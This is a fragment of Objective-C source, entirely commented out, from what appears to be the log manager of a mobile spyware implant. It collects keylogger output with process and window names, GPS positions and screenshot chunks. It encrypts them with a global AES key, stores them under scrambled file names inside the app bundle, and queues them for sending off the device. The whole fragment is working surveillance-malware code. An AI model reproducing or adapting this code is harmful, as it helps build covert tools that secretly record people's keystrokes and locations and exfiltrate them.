//  logRawHeader->userIdLength   = [userName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
//  logRawHeader->sourceIdLength = 0;
//  
//  if (anAgentHeader != nil && anAgentHeader != 0)
//    logRawHeader->additionalDataLength = [anAgentHeader length];
//  else
//    logRawHeader->additionalDataLength = 0;
//
//  int headerLength =  sizeof(logStruct) + 
//                      logRawHeader->deviceIdLength +
//                      logRawHeader->userIdLength +
//                      logRawHeader->sourceIdLength +
//                      logRawHeader->additionalDataLength;
//  
//  int paddedLength = headerLength;
//  
//  if (paddedLength % kCCBlockSizeAES128)
//    {
//      int pad = (paddedLength + kCCBlockSizeAES128 & ~(kCCBlockSizeAES128 - 1)) - paddedLength;
//      paddedLength += pad;
//    }
//    
//  paddedLength += sizeof(int);
//  
//  if (paddedLength < headerLength)
//    {
//      [logHeader release];
//      [outerPool release];
//      return nil;
//    }
//  
//  NSMutableData *rawHeader = [NSMutableData dataWithCapacity: [logHeader length]
//                              + [hostName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
//                              + [userName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
//                              + [anAgentHeader length]];
//  
//  // Clear dword at the start of the file which specifies the size of the
//  // unencrypted data
//  headerLength = paddedLength - sizeof(int);
//  
//  [rawHeader appendData: logHeader];
//  [rawHeader appendData: [hostName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
//  [rawHeader appendData: [userName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
//   
//  if (anAgentHeader != nil)
//    [rawHeader appendData: anAgentHeader];
//  
//  NSData *temp = [NSData dataWithBytes: gLogAesKey
//                                length: CC_MD5_DIGEST_LENGTH];
//  
//  CCCryptorStatus result = 0;
//  
//  // no padding on aligned block
//  result = [rawHeader __encryptWithKey: temp];
//  
//  [logHeader release];
//  
//  if (result == kCCSuccess)
//    {
//      NSMutableData *header = [NSMutableData dataWithCapacity: headerLength + sizeof(int)];
//      [header appendBytes: &headerLength length: sizeof(headerLength)];
//      [header appendData: rawHeader];
//      [header retain];
//      [outerPool release];
//      
//      return header;
//    }
//  
//  [outerPool release];
//  
//  return nil;
//}
//
//- (BOOL)createLog: (u_int)agentID
//      agentHeader: (NSData *)anAgentHeader
//        withLogID: (u_int)logID
//{
//  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
//  
//  BOOL success;
//  NSError *error;
//  
//  int64_t filetime;
//  NSString *encryptedLogName;
//  usleep(50000);
//  
//  do
//    {
//      NSString *logName;
//      
//      time_t unixTime;
//      time(&unixTime);
//      filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
//      int32_t hiPart = (int64_t)filetime >> 32;
//      int32_t loPart = (int64_t)filetime & 0xFFFFFFFF;
//
//      logName = [[NSString alloc] initWithFormat: @"LOGF_%.4X_%.8X%.8X.log",
//                                                  agentID,
//                                                  hiPart,
//                                                  loPart];
//    
//      @synchronized(self)
//      {
//        encryptedLogName = [NSString stringWithFormat:@"%@/%@/%@",
//                                                      [[NSBundle mainBundle] bundlePath],
//                                                      mCurrLogDir,
//                                                      [mEncryption scrambleForward: logName seed: gLogAesKey[0]]];
//          
//      }
//      
//      [logName release];
//    }
//  while ([[NSFileManager defaultManager] fileExistsAtPath: encryptedLogName] == TRUE);
//  
//  success = [@"" writeToFile: encryptedLogName
//                  atomically: NO
//                    encoding: NSUnicodeStringEncoding
//                       error: &error];
//  
//  if (success == YES)
//    {
//      NSFileHandle *logFileHandle = [NSFileHandle fileHandleForUpdatingAtPath: encryptedLogName];
//      if (logFileHandle) 
//        {
//          NSNumber *agent   = [[NSNumber alloc] initWithUnsignedInt: agentID];
//          NSNumber *_logID  = [[NSNumber alloc] initWithUnsignedInt: logID];
//          
//          NSArray *keys     = [NSArray arrayWithObjects: @"agentID",
//                                                         @"logID",
//                                                         @"logName",
//                                                         @"handle",
//                                                         @"header",
//                                                         nil];
//          NSArray *objects;
//          
//          if (anAgentHeader == nil)
//            {
//              objects  = [NSArray arrayWithObjects: agent,
//                                                    _logID,
//                                                    encryptedLogName,
//                                                    logFileHandle,
//                                                    @"NO",
//                                                    nil];
//            }
//          else
//            {
//              objects  = [NSArray arrayWithObjects: agent,
//                                                    _logID,
//                                                    encryptedLogName,
//                                                    logFileHandle,
//                                                    anAgentHeader,
//                                                    nil];
//            }
//          
//          NSMutableDictionary *agentLog = [[NSMutableDictionary alloc] init];
//          NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
//                                                                 forKeys: keys];
//          [agentLog addEntriesFromDictionary: dictionary];
//        
//          [agent release];
//          [_logID release];
//
//          // logHeader contains the whole encrypted header
//          // first dword is in clear text (padded size)
//          NSData *logHeader = [self createLogHeader: agentID
//                                          timestamp: filetime
//                                        agentHeader: anAgentHeader];
//          
//          if (logHeader == nil)
//            {  
//              [agentLog release];
//              [outerPool release];
//              return FALSE;
//            }
//
//          if ([self writeDataToLog: logHeader
//                         forHandle: logFileHandle] == FALSE)
//            {
//              [agentLog release];
//              [outerPool release];
//              return FALSE;
//            }
//            
//          [logHeader release];
//          
//          NSMutableArray *theQueue = [self getLogQueue:agentID andLogID: logID];
//          
//          @synchronized(theQueue) 
//          {
//            [theQueue addObject: agentLog];
//          }
//          
//          [agentLog release];
//          [outerPool release];
//          
//          return TRUE;
//        }
//    }
//  
//  [outerPool release];
//  
//  return FALSE;
//}
//
//- (BOOL)writeDataToLog: (NSData *)aData forHandle: (NSFileHandle *)anHandle
//{
//  @try
//    {
//      [anHandle writeData: aData];
//    }
//  @catch (NSException *e)
//    {
//#ifdef DEBUG
//      NSLog(@"%s exception", __FUNCTION__);
//#endif
//      
//      return FALSE;
//    }
//    
//  return TRUE;
//}
//
//- (BOOL)writeDataToLog: (NSMutableData *)aData 
//              forAgent: (u_int)agentID
//             withLogID: (u_int)logID
//{
//  BOOL dataWrited = FALSE;
//  id anObject     = nil;
//  id logObject    = nil;
//  NSMutableData *encData = nil;
//  
//  CCCryptorStatus result  = 0;
//  NSFileHandle *logHandle = nil;
//  
//  if (aData == nil)
//    return dataWrited;
//    
//  encData = [[NSMutableData alloc] initWithData: aData];
//  
//  // XXX- lunghezza non padded: per corretta decodifica
//  int _blockSize = [encData length];
//                                                                      
//  NSData *temp = [NSData dataWithBytes: gLogAesKey
//                                length: CC_MD5_DIGEST_LENGTH];
// 
//  // no padding on aligned blocks
//  result = [encData __encryptWithKey:temp];
//  
//  if (result != kCCSuccess)
//    {
//      [encData release];
//      return dataWrited;
//    }   
//   
//  // XXX-
//  //int _blockSize = [encData length];
//  
//  NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
//                                     length: sizeof(int)];
//              
//  NSMutableArray *theQueue = [self getLogQueue:agentID andLogID:logID];
//                                                                                                                
//  @synchronized(theQueue)
//  {
//    NSEnumerator *enumerator = [theQueue objectEnumerator];
//    
//    while (anObject = [enumerator nextObject])
//      {
//        if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID &&
//           ([[anObject objectForKey:@"logID"] unsignedIntValue] == logID || logID == 0))
//          {    
//            logObject = anObject;
//            break;
//          }    
//      }
//      
//      // found!!
//      if (logObject != nil)
//        {
//          logHandle = [logObject objectForKey: @"handle"];
//      
//          if (logHandle != nil)
//            {
//              [logHandle writeData: blockSize];
//              [logHandle writeData: encData];
//              dataWrited = TRUE;
//            }
//        }
//  }
//  
//  [encData release];
//    
//  return dataWrited;
//}
//
//- (BOOL)closeActiveLog: (u_int)agentID
//             withLogID: (u_int)logID
//{
//  BOOL logClosed = FALSE;
//  
//  id anObject  = nil;
//  id logObject = nil;
//  
//  NSMutableArray *theQueue = [self getLogQueue:agentID andLogID:logID];
//
//  @synchronized(theQueue)
//  {
//    NSEnumerator *enumerator = [theQueue objectEnumerator];
//    
//    while (anObject = [enumerator nextObject])
//      {
//        if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID &&
//            ([[anObject objectForKey: @"logID"] unsignedIntValue] == logID || logID == 0))
//          {
//            logObject = anObject;
//            break;
//          }
//      }
//      
//    // found the log: no synch yet
//    if (logObject != nil)
//      {
//        NSFileHandle *handle = [logObject objectForKey: @"handle"];
//        if (handle != nil)
//          {
//            [handle closeFile];
//            [logObject removeObjectForKey: @"handle"];
//          }
//        
//        // ok it's ready for sending
//        @synchronized(mSendQueue)
//        {
//          [mSendQueue addObject: logObject];
//        }
//        
//        // delete from log queued
//        [theQueue removeObject: logObject];
//        
//        logClosed = TRUE;
//      }
//  }
//  
//  usleep(10000);
//  
//  return logClosed;
//}
//
//- (BOOL)closeActiveLogsAndContinueLogging: (BOOL)continueLogging
//{
//  NSMutableIndexSet *discardedItem  = [NSMutableIndexSet indexSet];
//  NSMutableArray *newItems          = [[NSMutableArray alloc] init];
//  NSUInteger index                  = 0;
//  NSFileHandle *handle = nil;
//  
//  id item;
//  
//  @synchronized(mNoAutoQueuedLogs)
//  {
//    int count = [mNoAutoQueuedLogs count];
//    
//    for (index = 0; index < count; index++)
//      {      
//        item = [mNoAutoQueuedLogs objectAtIndex:index];
//
//        handle = [item objectForKey: @"handle"];
//        if (handle != nil) 
//          [handle closeFile];
//        
//        [newItems addObject: item];
//        [discardedItem addIndex: index];
//      }
//  
//    [mNoAutoQueuedLogs removeObjectsAtIndexes: discardedItem];
//  }
//  
//  @synchronized(mSendQueue)
//  {
//    [mSendQueue addObjectsFromArray: newItems];
//  }
//  
//  [self setMCurrLogDir: [self createLogDir]];
//  
//  [newItems release];
//  
//  return TRUE;
//}
//
//- (int)getSendLogItemCount
//{
//  int count;
//  
//  @synchronized(mSendQueue)
//  {
//    count = [mSendQueue count];
//  }
//  
//  return count;
//}
//
//- (id)getSendLogItemAtIndex:(int)theIndex
//{
//  id theItem;
//  
//  theItem = [mSendQueue objectAtIndex:theIndex];
//  
//  return theItem;
//}
//
//- (BOOL)clearSendLogQueue:(NSMutableIndexSet *)theSet
//{
//  if (theSet == nil)
//    return  FALSE;
//   
//  @synchronized(mSendQueue)
//  {
//    [mSendQueue removeObjectsAtIndexes: theSet];
//  }
//  
//  return TRUE;
//}
//
//#define IS_HEADER_MANDATORY(x) ((x & 0xFFFF0000))
//  
//- (BOOL)createAndWritePositionLog:(NSData*)aData
//{
//  BOOL retVal = TRUE;
//  
//  shMemoryLog *shMemLog = (shMemoryLog *)[aData bytes];
//  
//  NSData *additionalData = [NSData dataWithBytes:shMemLog->commandData 
//                                          length: sizeof(LocationAdditionalData)];
//  NSData *payload        = [NSData dataWithBytes:shMemLog->commandData + sizeof(LocationAdditionalData) 
//                                          length:sizeof(GPSInfo)];
//  if ([self createLog:shMemLog->agentID 
//          agentHeader:additionalData 
//            withLogID:shMemLog->logID])
//    {
//   
//      if ([self writeDataToLog:(NSMutableData*)payload 
//                  forAgent:shMemLog->agentID
//                 withLogID:shMemLog->logID] == FALSE)
//        {
//          retVal = FALSE;
//        }
//    }
//  else
//    return retVal = FALSE;
//  
//  return retVal;
//}
//
//- (BOOL)processNewLog:(NSData *)aData
//{
//  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
//  NSMutableData *payload;
//  
//  if (aData == nil)
//    return FALSE;
//    
//  shMemoryLog *shMemLog = (shMemoryLog *)[aData bytes];
//  
//    /*
//     * Keylog stream is: 
//     *   <0x0000,timestruct,process,null,window,null,DELIMETER,keystrokes...0x0000
//     *   timestruct,process,null,window,null,DELIMETER,keystrokes....>
//     */
//  if (shMemLog->agentID == LOG_KEYLOG)
//    {
//      if (IS_HEADER_MANDATORY(shMemLog->flag))
//        {
//          /*
//           * is mandatory if a app is started or re-opened from bg...
//           */
//          payload = [NSMutableData dataWithBytes: shMemLog->commandData 
//                                          length: shMemLog->commandDataSize];
//        }
//      else
//        {
//          /*
//           * only keystrokes will be appended in log streams
//           */
//          int off = (shMemLog->flag & 0x0000FFFF);
//          payload = [NSMutableData dataWithBytes: shMemLog->commandData + off 
//                                          length: shMemLog->commandDataSize - off];
//        }
//    }
//  else
//    if (shMemLog->agentID == LOGTYPE_LOCATION_NEW && shMemLog->logID == LOGTYPE_LOCATION_GPS)
//    {
//      payload = [NSMutableData dataWithBytes:shMemLog->commandData + sizeof(LocationAdditionalData) 
//                                      length:sizeof(GPSInfo)];
//    }
//  else
//    {
//      payload = [NSMutableData dataWithBytes: shMemLog->commandData
//                                      length: shMemLog->commandDataSize];
//    }
//  
//  // Log chunck have always type setted:
//  // Snapshot agents create, data, close
//  // other only data
//  switch (shMemLog->commandType) 
//  {
//    case CM_CREATE_LOG_HEADER:
//    {
//      [self createLog: shMemLog->agentID
//          agentHeader: payload
//            withLogID: shMemLog->logID];
//      break;
//    }
//    case CM_LOG_DATA:
//    {
//      // log streaming closed by sync: recreate and append whole log
//      // log screenshot: first chunk of new images with new logID
//      if ([self writeDataToLog: payload
//                      forAgent: shMemLog->agentID
//                     withLogID: shMemLog->logID] == FALSE)
//        {
//          if (shMemLog->agentID == LOGTYPE_LOCATION_NEW && shMemLog->logID == LOGTYPE_LOCATION_GPS)
//            {
//              [self createAndWritePositionLog: aData];                                                                                   
//            }
//          else if ([self createLog:shMemLog->agentID 
//                       agentHeader:nil 
//                         withLogID:shMemLog->logID])
//            {
//              /*
//               * the window and process info must be stored
//               * because sync recreate the log stream
//               */
//              if (shMemLog->agentID == LOG_KEYLOG)
//                {
//                  payload = [NSMutableData dataWithBytes: shMemLog->commandData
//                                                  length: shMemLog->commandDataSize];
//                }
//              
//              [self writeDataToLog:payload 
//                          forAgent:shMemLog->agentID
//                         withLogID:shMemLog->logID];
//            }
//        }
//      break;
//    }
//    case CM_CLOSE_LOG:
//    {
//      // Write latest block and close
//      [self writeDataToLog:payload 
//                  forAgent:shMemLog->agentID
//                 withLogID:shMemLog->logID];
//      
//      [self closeActiveLog: shMemLog->agentID
//                 withLogID: shMemLog->logID];
//
//      break;
//    }
//    default:
//      break;
//  }
//                 
//  [pool release];
//  
//  return TRUE;
//}
//
//- (BOOL)addMessage: (NSData*)aMessage
//{
//  // messages removed by handleMachMessage
//  @synchronized(mLogMessageQueue)
//  {
//    [mLogMessageQueue addObject: aMessage];
//  }
//  
//  return TRUE;
//}
//
//typedef struct _coreMessage_t
//{
//  mach_msg_header_t header;
//  uint dataLen;
//} coreMessage_t;
//
//// handle the incomings logs
//- (void) handleMachMessage:(void *) msg 
//{
//  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
//
//  coreMessage_t *coreMsg = (coreMessage_t*)msg;
//  
//  NSData *theData = [NSData dataWithBytes: ((u_char*)msg + sizeof(coreMessage_t))  
//                                   length: coreMsg->dataLen];
//
//  [self addMessage: theData];
//  
//  [pool release];
//}
//
//// Process new incoming logs
//-(int)processIncomingLogs
//{
//  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
//  
//  NSMutableArray *tmpMessages;
//  
//  @synchronized(mLogMessageQueue)
//  {
//    tmpMessages = [[mLogMessageQueue copy] autorelease];
//    [mLogMessageQueue removeAllObjects];
//  }
//  
//#ifdef DEBUG
//  NSLog(@"%s: process messages %d", __FUNCTION__, [tmpMessages count]);
//#endif  
//
//  int logCount = [tmpMessages count];
//  
//  for (int i=0; i < logCount; i++)
//    {
//      [self processNewLog: [tmpMessages objectAtIndex:i]];
//    }
//    
//  [pool release];
//  
//  return logCount;
//}
//
//NSString *kRunLoopLogManagerMode = @"kRunLoopLogManagerMode";
//
//- (void)logManagerRunLoop
//{
//  NSRunLoop *logManagerRunLoop = [NSRunLoop currentRunLoop];
//  
//  notificationPort = [[NSMachPort alloc] init];
//  [notificationPort setDelegate: self];
//  
//  [logManagerRunLoop addPort: notificationPort 
//                     forMode: kRunLoopLogManagerMode];
//  
//  // run the log loop: _i_Core send notification to this
//  // this thread won't be never stopped...
//  while (TRUE)
//  {
//    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
//    
//    [logManagerRunLoop runMode: kRunLoopLogManagerMode 
//                    beforeDate: [NSDate dateWithTimeIntervalSinceNow:1.5]];
//    
//    // process incoming logs out of the runloop
//    [self processIncomingLogs];   
//    
//    [pool release];
//  }
//}
//
//- (void)start
//{
//  [NSThread detachNewThreadSelector: @selector(logManagerRunLoop) 
//                           toTarget: self withObject:nil];
//}
//
//#pragma mark -
//#pragma mark Accessors
//#pragma mark -
//
//- (NSMutableArray *)mActiveQueue
//{
//  return mActiveQueue;
//}
//
//@end
